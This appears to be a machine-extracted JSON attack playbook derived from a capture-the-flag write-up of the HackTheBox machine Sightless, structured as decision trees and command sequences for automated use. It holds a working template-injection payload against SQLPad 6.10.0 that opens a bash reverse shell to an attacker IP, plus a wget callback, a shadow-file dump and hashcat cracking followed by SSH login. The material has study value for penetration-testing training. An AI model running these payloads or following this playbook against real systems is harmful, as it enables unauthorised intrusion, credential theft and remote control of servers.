@@ -1,0 +1,860 @@
+{
+  "writeup_id": "Htb_Sightless",
+  "scenario_fingerprint": {
+    "scenario_name": "linux_web_app_container_escape",
+    "primary_services": [
+      "http",
+      "ssh",
+      "ftp"
+    ],
+    "port_signature": "21+22+80",
+    "service_combination": "ftp+ssh+http",
+    "os_family": "linux",
+    "environment_type": "containerized_web_application",
+    "entry_vector": "server_side_template_injection",
+    "privilege_path": "container_root_to_host_user_to_root",
+    "attack_complexity": "easy",
+    "estimated_time": "60-90 minutes",
+    "scenario_confidence": 0.92,
+    "distinguishing_factors": [
+      "sqlpad_application",
+      "ssti_vulnerability",
+      "container_environment",
+      "shadow_file_access",
+      "froxlor_panel"
+    ],
+    "environmental_clues": [
+      "nginx_reverse_proxy",
+      "subdomain_structure",
+      "ssl_required_ftp",
+      "ubuntu_22_04_host"
+    ],
+    "similar_scenarios": [
+      "container_escape_htb",
+      "web_app_container_privesc"
+    ],
+    "unique_aspects": [
+      "sqlpad_to_froxlor_chain",
+      "keepass_database_discovery",
+      "xss_to_ftp_access",
+      "chrome_debug_unintended"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "Server-Side Template Injection (SSTI)",
+        "success_reason": "SQLPad 6.10.0 vulnerable to template injection in connection test endpoint",
+        "prerequisite_indicators": [
+          "sqlpad_application_accessible",
+          "version_6.10.0_or_below",
+          "connection_test_endpoint_available"
+        ],
+        "recognition_patterns": [
+          "SQLPad application interface",
+          "version disclosure in About menu",
+          "connection test functionality present",
+          "template engine error messages"
+        ],
+        "failure_modes": [
+          "patched_version_6.10.1_or_higher",
+          "connection_test_disabled",
+          "template_injection_filtered",
+          "application_not_accessible"
+        ],
+        "environmental_factors": [
+          "containerized_application",
+          "default_sqlpad_configuration",
+          "no_input_validation",
+          "template_engine_exposed"
+        ],
+        "success_probability": 0.95,
+        "typical_timeframe": "10-20 minutes"
+      },
+      {
+        "technique": "Container Escape via Shadow File",
+        "success_reason": "Root access in container allowed shadow file dump and password cracking",
+        "prerequisite_indicators": [
+          "root_access_in_container",
+          "shadow_file_readable",
+          "weak_user_passwords",
+          "shared_credentials_with_host"
+        ],
+        "recognition_patterns": [
+          "container environment detected",
+          "shadow file contains hashes",
+          "hashcat successfully cracks passwords",
+          "same credentials work on SSH"
+        ],
+        "failure_modes": [
+          "strong_password_policy",
+          "no_shared_credentials",
+          "shadow_file_not_accessible",
+          "ssh_access_restricted"
+        ],
+        "environmental_factors": [
+          "password_reuse_between_systems",
+          "weak_password_policies",
+          "container_misconfiguration",
+          "insufficient_isolation"
+        ],
+        "success_probability": 0.75,
+        "typical_timeframe": "15-30 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "SQLPad version 6.10.0",
+        "discovery_method": "About menu in application interface",
+        "why_critical": "Vulnerable to CVE-2022-0944 SSTI leading to RCE",
+        "how_to_recognize": [
+          "version number in About dialog",
+          "SQLPad application interface",
+          "connection test functionality available"
+        ],
+        "follow_up_actions": [
+          "test_template_injection_payload",
+          "exploit_connection_test_endpoint",
+          "establish_reverse_shell"
+        ]
+      },
+      {
+        "discovery": "Crackable password hash in shadow file",
+        "discovery_method": "Shadow file dump from container root access",
+        "why_critical": "Provided SSH access to host system",
+        "how_to_recognize": [
+          "shadow file accessible with root",
+          "weak password patterns",
+          "hashcat successfully cracks hash"
+        ],
+        "follow_up_actions": [
+          "test_ssh_access_with_credentials",
+          "enumerate_host_system",
+          "look_for_privilege_escalation"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "container_root",
+        "escalation_method": "credential_reuse_to_host_ssh",
+        "why_possible": "Same user credentials used in container and host system",
+        "recognition_signs": [
+          "shadow_file_contains_user_hashes",
+          "weak_passwords_crackable",
+          "ssh_service_accessible_on_host",
+          "credential_reuse_pattern"
+        ],
+        "exploitation_path": "SSTI → Container Root → Shadow Dump → Password Crack → SSH Access"
+      },
+      {
+        "privilege_level": "user_ssh_access",
+        "escalation_method": "froxlor_xss_to_ftp_access",
+        "why_possible": "Froxlor application vulnerable to XSS enabling FTP configuration",
+        "recognition_signs": [
+          "froxlor_application_running",
+          "xss_vulnerability_present",
+          "ftp_service_available",
+          "keepass_database_in_ftp"
+        ],
+        "exploitation_path": "SSH User → Froxlor XSS → FTP Enable → KeePass DB → Root SSH Key"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found ports 21,22,80 open on Linux host with nginx redirect to domain",
+        "decision": "Enumerate web applications and subdomains first",
+        "reasoning": "HTTP redirect indicates virtual hosting, likely multiple applications",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "ftp_enumeration",
+            "when": "if web apps fail"
+          },
+          {
+            "option": "ssh_enumeration",
+            "when": "if credentials found"
+          }
+        ],
+        "success_indicators": [
+          "subdomain_discovered",
+          "application_identified",
+          "version_information_found"
+        ],
+        "next_decision": "identify_application_vulnerabilities"
+      },
+      {
+        "step": 2,
+        "situation": "Discovered SQLPad application version 6.10.0",
+        "decision": "Search for SQLPad CVEs and test template injection",
+        "reasoning": "Specific version identified, known CVE-2022-0944 affects versions up to 6.10.0",
+        "confidence": 0.95,
+        "prerequisites": [
+          "application_version_confirmed",
+          "connection_test_endpoint_accessible"
+        ],
+        "success_indicators": [
+          "template_injection_confirmed",
+          "rce_achieved"
+        ],
+        "failure_fallbacks": [
+          "directory_brute_force",
+          "parameter_fuzzing",
+          "authentication_bypass"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Achieved RCE as root in SQLPad container",
+        "decision": "Enumerate container environment and look for credential files",
+        "reasoning": "Container root doesn't equal host access, need to find escape path",
+        "confidence": 0.85,
+        "prerequisites": [
+          "container_shell_obtained"
+        ],
+        "success_indicators": [
+          "shadow_file_found",
+          "config_files_discovered",
+          "network_enumeration_complete"
+        ],
+        "failure_fallbacks": [
+          "container_escape_techniques",
+          "service_enumeration",
+          "file_system_analysis"
+        ]
+      },
+      {
+        "step": 4,
+        "situation": "Found shadow file with user hashes in container",
+        "decision": "Extract and crack password hashes",
+        "reasoning": "Shadow file access indicates potential password reuse on host system",
+        "confidence": 0.8,
+        "prerequisites": [
+          "shadow_file_readable",
+          "hash_extraction_possible"
+        ],
+        "success_indicators": [
+          "passwords_cracked",
+          "ssh_access_gained"
+        ],
+        "failure_fallbacks": [
+          "ssh_key_search",
+          "service_credential_hunting",
+          "container_escape"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_template_injection_succeeds": {
+        "action": "establish_reverse_shell",
+        "tools": [
+          "bash",
+          "nc",
+          "wget"
+        ],
+        "next_phase": "container_enumeration"
+      },
+      "if_template_injection_fails": {
+        "action": "try_alternative_web_attacks",
+        "alternatives": [
+          "sql_injection",
+          "file_upload",
+          "authentication_bypass"
+        ],
+        "decision_criteria": "based_on_application_functionality"
+      },
+      "if_container_credentials_found": {
+        "action": "test_credential_reuse",
+        "targets": [
+          "ssh_service",
+          "ftp_service",
+          "web_applications"
+        ],
+        "tools": [
+          "hashcat",
+          "john",
+          "hydra"
+        ]
+      },
+      "if_host_access_obtained": {
+        "action": "enumerate_additional_services",
+        "purpose": "find_privilege_escalation_paths",
+        "tools": [
+          "linpeas",
+          "netstat",
+          "ps"
+        ]
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_check_application_versions_for_cves",
+        "reasoning": "specific_versions_often_have_known_exploits",
+        "applicability": "web_application_enumeration"
+      },
+      {
+        "rule": "prioritize_template_injection_in_connection_test_endpoints",
+        "reasoning": "common_vulnerability_pattern_in_database_management_tools",
+        "applicability": "database_administration_applications"
+      },
+      {
+        "rule": "dump_shadow_files_when_container_root_achieved",
+        "reasoning": "high_probability_of_password_reuse_between_container_and_host",
+        "applicability": "containerized_environments"
+      },
+      {
+        "rule": "test_ftp_ssl_after_obtaining_credentials",
+        "reasoning": "ftp_often_reuses_system_credentials_and_may_reveal_additional_files",
+        "applicability": "when_ftp_service_detected_and_credentials_available"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "Server-Side Template Injection",
+        "mitre_id": "T1190",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "web_application_detected",
+          "template_engine_present",
+          "user_input_processed"
+        ],
+        "success_indicators": [
+          "template_syntax_reflected",
+          "code_execution_achieved",
+          "error_messages_reveal_engine"
+        ],
+        "incompatible_with": [
+          "input_sanitization_enabled",
+          "template_sandboxing_active",
+          "waf_blocking_payloads"
+        ],
+        "confidence_boosters": [
+          "sqlpad_application_detected",
+          "vulnerable_version_identified",
+          "template_injection_vectors_available"
+        ],
+        "typical_success_rate": 0.85,
+        "estimated_time": "10-30 minutes"
+      },
+      {
+        "technique": "Shadow File Extraction",
+        "mitre_id": "T1003.008",
+        "required_services": [
+          "shell_access"
+        ],
+        "required_ports": [],
+        "os_requirements": [
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "root_or_privileged_access",
+          "readable_shadow_file",
+          "container_or_host_access"
+        ],
+        "success_indicators": [
+          "shadow_file_readable",
+          "password_hashes_extracted",
+          "user_accounts_enumerated"
+        ],
+        "incompatible_with": [
+          "shadow_file_protected",
+          "insufficient_privileges",
+          "selinux_enforcing"
+        ],
+        "confidence_boosters": [
+          "container_environment",
+          "root_shell_obtained",
+          "weak_file_permissions"
+        ],
+        "typical_success_rate": 0.9,
+        "estimated_time": "2-5 minutes"
+      },
+      {
+        "technique": "Password Cracking",
+        "mitre_id": "T1110.002",
+        "required_services": [],
+        "required_ports": [],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "password_hashes_obtained",
+          "cracking_tools_available",
+          "wordlists_accessible"
+        ],
+        "success_indicators": [
+          "hash_format_recognized",
+          "plaintext_recovered",
+          "weak_passwords_identified"
+        ],
+        "incompatible_with": [
+          "strong_password_policy",
+          "salted_hashes_only",
+          "bcrypt_high_rounds"
+        ],
+        "confidence_boosters": [
+          "common_hash_formats",
+          "default_passwords_used",
+          "weak_complexity_requirements"
+        ],
+        "typical_success_rate": 0.65,
+        "estimated_time": "15 minutes - 24 hours"
+      },
+      {
+        "technique": "Cross-Site Scripting (XSS)",
+        "mitre_id": "T1059.007",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "web_application_detected",
+          "user_input_reflected",
+          "insufficient_output_encoding"
+        ],
+        "success_indicators": [
+          "javascript_execution_confirmed",
+          "session_hijacking_possible",
+          "admin_panel_access_gained"
+        ],
+        "incompatible_with": [
+          "csp_headers_strict",
+          "input_validation_comprehensive",
+          "output_encoding_proper"
+        ],
+        "confidence_boosters": [
+          "froxlor_application_detected",
+          "admin_interface_accessible",
+          "legacy_web_application"
+        ],
+        "typical_success_rate": 0.7,
+        "estimated_time": "20-45 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "web_application": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http",
+          "https",
+          "nginx",
+          "apache"
+        ],
+        "banner_indicators": [
+          "nginx",
+          "apache",
+          "iis"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "ftp_service": {
+        "port_indicators": [
+          21
+        ],
+        "service_indicators": [
+          "ftp",
+          "proftpd"
+        ],
+        "banner_indicators": [
+          "ProFTPD",
+          "vsftpd",
+          "FileZilla"
+        ],
+        "confidence_threshold": 0.95
+      },
+      "ssh_service": {
+        "port_indicators": [
+          22
+        ],
+        "service_indicators": [
+          "ssh",
+          "openssh"
+        ],
+        "banner_indicators": [
+          "OpenSSH",
+          "SSH"
+        ],
+        "confidence_threshold": 0.98
+      },
+      "container_environment": {
+        "port_indicators": [],
+        "service_indicators": [
+          "docker",
+          "container"
+        ],
+        "banner_indicators": [
+          "container",
+          "docker"
+        ],
+        "confidence_threshold": 0.8
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "ssti_exploitation",
+          "when": "sqlpad_application_detected",
+          "reason": "known_vulnerability_high_success_rate"
+        },
+        {
+          "attack": "shadow_file_extraction",
+          "when": "root_container_access_gained",
+          "reason": "reliable_credential_harvesting"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "password_cracking",
+          "when": "hashes_extracted",
+          "reason": "time_consuming_but_often_successful"
+        },
+        {
+          "attack": "xss_exploitation",
+          "when": "admin_web_interface_detected",
+          "reason": "can_lead_to_privilege_escalation"
+        }
+      ],
+      "low_priority": [
+        {
+          "attack": "ftp_bruteforce",
+          "when": "ftp_service_detected_without_creds",
+          "reason": "requires_credentials_first"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "Server-Side Template Injection (SSTI)",
+        "mitre_id": "T1190",
+        "category": "initial_access",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "SQLPad Connection Test",
+            "command_template": "{{ process.mainModule.require('child_process').exec('{command}') }}",
+            "actual_command": "{{ process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/10.10.14.6/443 0>&1\"') }}",
+            "output_pattern": "reverse_shell_connection",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          }
+        ],
+        "prerequisites": [
+          "sqlpad_version_6.10.0_or_below",
+          "access_to_connection_test_endpoint",
+          "nodejs_child_process_module_available"
+        ],
+        "success_indicators": [
+          "reverse_shell_established",
+          "command_execution_confirmed",
+          "root_access_in_container"
+        ],
+        "common_failures": [
+          "template_syntax_errors",
+          "network_connectivity_blocked",
+          "missing_system_commands"
+        ],
+        "follow_up_techniques": [
+          "container_escape",
+          "credential_harvesting",
+          "lateral_movement"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "Password Hash Cracking",
+        "mitre_id": "T1110.002",
+        "category": "credential_access",
+        "phase": "credential_access",
+        "tools_used": [
+          {
+            "name": "hashcat",
+            "command_template": "hashcat {hash_file} {wordlist} --user",
+            "actual_command": "hashcat hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt --user",
+            "output_pattern": "password_cracked_successfully",
+            "effectiveness_rating": 4,
+            "reliability": 0.8
+          }
+        ],
+        "prerequisites": [
+          "access_to_shadow_file",
+          "sha512_crypt_hashes_present",
+          "wordlist_available"
+        ],
+        "success_indicators": [
+          "hash_cracked_within_reasonable_time",
+          "plaintext_password_recovered",
+          "credentials_valid_for_ssh_access"
+        ],
+        "common_failures": [
+          "strong_passwords_resist_cracking",
+          "insufficient_wordlist_coverage",
+          "hardware_limitations"
+        ],
+        "follow_up_techniques": [
+          "ssh_authentication",
+          "credential_reuse_testing",
+          "privilege_escalation"
+        ],
+        "time_investment": "10 minutes - several hours",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "Container Privilege Escalation",
+        "mitre_id": "T1611",
+        "category": "privilege_escalation",
+        "phase": "privilege_escalation",
+        "tools_used": [
+          {
+            "name": "shadow_file_access",
+            "command_template": "cat /etc/shadow | grep '\\$'",
+            "actual_command": "cat /etc/shadow | grep '\\$'",
+            "output_pattern": "user_password_hashes",
+            "effectiveness_rating": 5,
+            "reliability": 0.98
+          }
+        ],
+        "prerequisites": [
+          "root_access_in_container",
+          "shadow_file_readable",
+          "users_with_password_hashes"
+        ],
+        "success_indicators": [
+          "password_hashes_extracted",
+          "user_credentials_compromised",
+          "host_system_access_gained"
+        ],
+        "common_failures": [
+          "no_password_hashes_set",
+          "shadow_file_not_accessible",
+          "container_isolation_effective"
+        ],
+        "follow_up_techniques": [
+          "host_system_enumeration",
+          "ssh_lateral_movement",
+          "further_privilege_escalation"
+        ],
+        "time_investment": "5-20 minutes",
+        "skill_level": "intermediate"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "SQLPad",
+        "use_case": "template_injection_exploitation",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "low",
+        "essential_for": [
+          "nodejs_application_exploitation"
+        ],
+        "alternatives": [
+          "direct_rce_exploits",
+          "file_upload_vulnerabilities"
+        ],
+        "best_practices": [
+          "test_with_simple_commands_first",
+          "use_available_system_binaries",
+          "escape_special_characters_properly"
+        ]
+      },
+      {
+        "tool": "hashcat",
+        "use_case": "sha512_crypt_hash_cracking",
+        "effectiveness_rating": 4,
+        "reliability": 0.85,
+        "learning_curve": "low",
+        "essential_for": [
+          "password_recovery",
+          "credential_access"
+        ],
+        "alternatives": [
+          "john_the_ripper",
+          "custom_scripts"
+        ],
+        "best_practices": [
+          "use_user_flag_for_username_hash_format",
+          "start_with_common_wordlists",
+          "monitor_cracking_progress"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "sqlpad_ssti_to_shell",
+        "steps": [
+          {
+            "step": 1,
+            "command": "Create new connection with server: {{ process.mainModule.require('child_process').exec('wget http://10.10.14.6/test') }}",
+            "purpose": "Test template injection RCE",
+            "expected_output": "HTTP request to attacker server"
+          },
+          {
+            "step": 2,
+            "command": "Create connection with: {{ process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/10.10.14.6/443 0>&1\"') }}",
+            "purpose": "Establish reverse shell",
+            "expected_output": "Root shell in SQLPad container"
+          },
+          {
+            "step": 3,
+            "command": "cat /etc/shadow | grep '\\$'",
+            "purpose": "Extract password hashes",
+            "expected_output": "SHA512 crypt hashes for users"
+          }
+        ],
+        "success_rate": 0.92,
+        "typical_duration": "10-20 minutes"
+      },
+      {
+        "sequence_name": "hash_crack_to_ssh",
+        "steps": [
+          {
+            "step": 1,
+            "command": "hashcat hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt --user",
+            "purpose": "Crack extracted password hashes",
+            "expected_output": "Plaintext password for michael user"
+          },
+          {
+            "step": 2,
+            "command": "ssh michael@10.10.11.32",
+            "purpose": "Authenticate to host system",
+            "expected_output": "SSH shell as michael on host"
+          }
+        ],
+        "success_rate": 0.75,
+        "typical_duration": "5-60 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Sightless",
+      "difficulty": "Easy",
+      "os": "Linux",
+      "platform": "HackTheBox",
+      "release_date": "2024-09-07",
+      "author": "EmSec",
+      "estimated_time": "60-90 minutes"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "medium",
+      "skill_level_required": "intermediate",
+      "primary_attack_vectors": [
+        "ssti",
+        "container_escape",
+        "xss",
+        "credential_reuse"
+      ],
+      "key_vulnerabilities": [
+        "sqlpad_ssti",
+        "froxlor_xss",
+        "weak_credentials",
+        "exposed_keepass_db"
+      ],
+      "environment_type": "containerized_web_application",
+      "real_world_relevance": "high",
+      "learning_value": [
+        "ssti_exploitation",
+        "container_enumeration",
+        "xss_chaining",
+        "keepass_extraction"
+      ],
+      "prerequisite_knowledge": [
+        "template_injection",
+        "container_concepts",
+        "web_exploitation",
+        "password_cracking"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_exploitation",
+      "subcategories": [
+        "template_injection",
+        "container_security",
+        "credential_access"
+      ],
+      "attack_types": [
+        "initial_access",
+        "credential_access",
+        "privilege_escalation"
+      ],
+      "defensive_lessons": [
+        "secure_template_engines",
+        "container_hardening",
+        "credential_management",
+        "xss_prevention"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Shoppy",
+        "Precious",
+        "Backdoor"
+      ],
+      "similarity_reasons": [
+        "ssti_exploitation",
+        "container_environments",
+        "multi_stage_attacks"
+      ],
+      "unique_aspects": [
+        "sqlpad_application",
+        "froxlor_panel",
+        "keepass_database_extraction"
+      ],
+      "difficulty_factors": [
+        "multiple_attack_vectors",
+        "container_enumeration",
+        "credential_chaining"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T12:10:33.461703",
+    "original_file": "0xdf_writeups/Htb Sightless.md",
+    "content_length": 73625,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 0.9166666666666667,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 0.6666666666666666,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
